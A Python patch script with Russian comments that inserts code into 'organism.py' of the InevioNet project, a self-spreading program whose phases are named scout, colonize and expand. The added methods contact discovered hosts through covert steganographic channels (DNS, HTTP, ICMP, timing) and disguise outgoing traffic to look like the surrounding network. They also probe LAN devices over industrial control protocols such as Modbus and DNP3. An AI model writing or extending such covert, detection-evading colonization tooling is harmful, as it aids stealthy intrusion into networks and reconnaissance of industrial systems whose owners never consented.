# patch96v2.py - P96-v2: Steganography + Masking + WebRTC + Industrial (БЕЗ I2P/Tor)
import os
import ast
import shutil
import re

ROOT = r"E:\InevioNet"
ORG = os.path.join(ROOT, "inevionet", "organism.py")

BAK = ".bak_p96v2"


def patch_file(path, replacements, label, bak=BAK):
    if not os.path.exists(path):
        print("  [!!] NOT FOUND: " + path)
        return False
    with open(path, "r", encoding="utf-8") as f:
        content = f.read()
    b = path + bak
    shutil.copy2(path, b)
    print("  [BK] " + os.path.basename(b))
    changed = 0
    for old, new, required in replacements:
        if new and new in content and (not old or old not in content):
            print("  [--] already applied")
            continue
        if old and old in content:
            content = content.replace(old, new, 1)
            changed += 1
            print("  [OK] " + old[:55].strip().replace(chr(10), ' '))
        else:
            if required:
                print("  [!!] NOT FOUND: " + old[:55].strip().replace(chr(10), ' '))
    if changed > 0:
        with open(path, "w", encoding="utf-8") as f:
            f.write(content)
        if path.endswith(".py"):
            try:
                ast.parse(content)
                print("  [OK] syntax " + label)
                return True
            except SyntaxError as e:
                print("  [!!] syntax: " + str(e))
                shutil.copy2(b, path)
                print("  [--] rolled back")
                return False
    return True


# =====================================================================
# 1. stats: + stego/webrtc/industrial
# =====================================================================

print()
print("=" * 70)
print("  1. stats: + stego/webrtc/industrial")
print("=" * 70)

old_stats = '''            "nodes_capsuled": 0,
            "max_depth": 0,
            "started_at": time.time(),
        }'''

new_stats = '''            "nodes_capsuled": 0,
            "max_depth": 0,
            "stego_sent": 0,
            "mask_applied": 0,
            "webrtc_sent": 0,
            "industrial_probed": 0,
            "started_at": time.time(),
        }'''

patch_file(ORG, [(old_stats, new_stats, True)], "stats stego")


# =====================================================================
# 2. live(): + фаза communicate
# =====================================================================

print()
print("=" * 70)
print("  2. live(): + фаза communicate")
print("=" * 70)

old_live = '''                _t4 = time.time()
                self.expand()
                logger.info("[Organism] expand: %.1fs", time.time() - _t4)'''

new_live = '''                # === P96-v2: COMMUNICATE через СВОИ каналы ===
                _t3b = time.time()
                self.communicate(found[:20])
                logger.info("[Organism] communicate: %.1fs", time.time() - _t3b)

                _t4 = time.time()
                self.expand()
                logger.info("[Organism] expand: %.1fs", time.time() - _t4)'''

patch_file(ORG, [(old_live, new_live, True)], "live communicate")


# =====================================================================
# 3. Добавить методы: _stego_send, _mask_traffic, _webrtc_send, _industrial_probe, communicate
# =====================================================================

print()
print("=" * 70)
print("  3. Методы: stego/mask/webrtc/industrial/communicate")
print("=" * 70)

# Вставить перед _log_phase (он есть)
old_log = '''    def _log_phase(self, phase, elapsed, extra=""):'''

new_methods = '''    # =================================================================
    # P96-v2: СКРЫТНОСТЬ (Steganography + Masking + WebRTC + Industrial)
    # БЕЗ I2P/Tor - своя анонимность через стеганографию
    # =================================================================

    def _stego_send(self, ip, payload):
        """P96-v2: отправка через скрытый канал (DNS/HTTP/ICMP/Timing)."""
        try:
            stego = getattr(self.net, "steganography", None)
            if not stego:
                return False
            # Пробуем разные каналы
            for ch in ("dns", "http", "icmp", "timing"):
                tunnel = getattr(stego, ch, None)
                if tunnel and hasattr(tunnel, "send"):
                    try:
                        tunnel.send(ip, payload)
                        return True
                    except Exception:
                        continue
                # Или через engine
                if hasattr(stego, "send_via"):
                    try:
                        stego.send_via(ch, ip, payload)
                        return True
                    except Exception:
                        continue
        except Exception as e:
            logger.debug("[Stego] %s: %s", ip, e)
        return False

    def _mask_traffic(self):
        """P96-v2: маскировка исходящего трафика под сеть."""
        try:
            masking = getattr(self.net, "_masking_engine", None)
            if not masking:
                return False
            # Применяем адаптацию маскировки
            if hasattr(masking, "adapt"):
                profile = self._get_current_profile()
                masking.adapt(profile)
                return True
            elif hasattr(masking, "mask") and hasattr(self.net, "_ambient_masker"):
                return True
        except Exception as e:
            logger.debug("[Mask] %s", e)
        return False

    def _webrtc_send(self, ip, payload=None):
        """P96-v2: WebRTC DataChannel."""
        try:
            webrtc = getattr(self.net, "webrtc", None)
            if webrtc and hasattr(webrtc, "send"):
                webrtc.send(ip, payload or {"type": "hello"})
                return True
        except Exception as e:
            logger.debug("[WebRTC] %s: %s", ip, e)
        return False

    def _industrial_probe(self, ip):
        """P96-v2: probe через industrial протоколы (Modbus/MQTT/OPCUA/DNP3)."""
        try:
            industrial = getattr(self.net, "industrial", None)
            if not industrial:
                return False
            for proto in ("modbus", "mqtt", "opcua", "dnp3"):
                p = getattr(industrial, proto, None)
                if p and hasattr(p, "probe"):
                    try:
                        p.probe(ip)
                        return True
                    except Exception:
                        continue
        except Exception as e:
            logger.debug("[Industrial] %s: %s", ip, e)
        return False

    def _get_current_profile(self):
        """P96-v2: текущий профиль сети для маскировки."""
        try:
            am = getattr(self.net, "_ambient_masker", None)
            if am and hasattr(am, "get_network_profile"):
                return am.get_network_profile() or {}
            sm = getattr(getattr(self.net, "mycelium", None), "spores", None)
            if sm and hasattr(sm, "get_any_profile"):
                return sm.get_any_profile() or {}
        except Exception:
            pass
        return {}

    def communicate(self, peers):
        """P96-v2: общение через СВОИ каналы (stego/webrtc/industrial).
        
        I2P/Tor НЕ используем - своя анонимность через стеганографию.
        """
        c_stego = c_web = c_ind = 0
        for peer in peers:
            ip = peer.get("ip")
            if not ip:
                continue
            try:
                # 1. Стеганография (DNS/HTTP/ICMP/Timing) - своя анонимность
                if self._stego_send(ip, {"type": "hello", "node_id": self.net.node_id}):
                    c_stego += 1
                # 2. WebRTC (если браузер) - свой P2P
                if self._webrtc_send(ip):
                    c_web += 1
                # 3. Industrial (для IoT/SCADA) - свой IoT
                if peer.get("type") in ("lan_device", "service"):
                    if self._industrial_probe(ip):
                        c_ind += 1
            except Exception as e:
                logger.debug("[Communicate] %s: %s", ip, e)
        
        if c_stego or c_web or c_ind:
            with self._lock:
                self.stats["stego_sent"] = self.stats.get("stego_sent", 0) + c_stego
                self.stats["webrtc_sent"] = self.stats.get("webrtc_sent", 0) + c_web
                self.stats["industrial_probed"] = self.stats.get("industrial_probed", 0) + c_ind
            logger.info("[Communicate] stego=%d webrtc=%d industrial=%d",
                        c_stego, c_web, c_ind)

    def _log_phase(self, phase, elapsed, extra=""):'''

patch_file(ORG, [(old_log, new_methods, True)], "organism stego methods")


# =====================================================================
# 4. colonize: + _mask_traffic
# =====================================================================

print()
print("=" * 70)
print("  4. colonize: + mask")
print("=" * 70)

old_col = '''        self._log_phase("colonize", 0, f"{ip} -> {action}")'''

new_col = '''        # P96-v2: маскировка
        try:
            if self._mask_traffic():
                with self._lock:
                    self.stats["mask_applied"] = self.stats.get("mask_applied", 0) + 1
        except Exception as e:
            logger.debug("[Colonize] mask: %s", e)
        
        self._log_phase("colonize", 0, f"{ip} -> {action}")'''

patch_file(ORG, [(old_col, new_col, True)], "colonize mask")


# =====================================================================
# 5. scout: + stego probe для LAN
# =====================================================================

print()
print("=" * 70)
print("  5. scout: stego probe")
print("=" * 70)

old_scout_mdns = '''        # === 2. mDNS/SSDP - async-friendly (короткий timeout) ==='''

new_scout_mdns = '''        # === 1.5 P96-v2: Steganography probe для LAN-устройств ===
        try:
            c_stego = 0
            for node in list(found):
                if node.get("type") in ("lan_device", "service"):
                    ip = node["ip"]
                    if self._stego_send(ip, {"type": "probe"}):
                        node["stego_ok"] = True
                        c_stego += 1
            if c_stego:
                logger.info("[Scout] stego_ok=%d", c_stego)
        except Exception as e:
            logger.debug("[Scout] stego: %s", e)

        # === 2. mDNS/SSDP - async-friendly (короткий timeout) ==='''

patch_file(ORG, [(old_scout_mdns, new_scout_mdns, False)], "scout stego probe")


print()
print("=" * 70)
print("  PATCH 96-V2 DONE")
print("=" * 70)
print("  [OK] stats: + stego_sent, mask_applied, webrtc_sent, industrial_probed")
print("  [OK] live: + фаза communicate")
print("  [OK] методы: _stego_send, _mask_traffic, _webrtc_send, _industrial_probe")
print("  [OK] communicate(): stego + webrtc + industrial (БЕЗ I2P/Tor)")
print("  [OK] colonize: + _mask_traffic")
print("  [OK] scout: stego probe")
print()
print("Перезапуск + 90 сек:")
print("  curl -k https://localhost:8080/api/organism | python -m json.tool")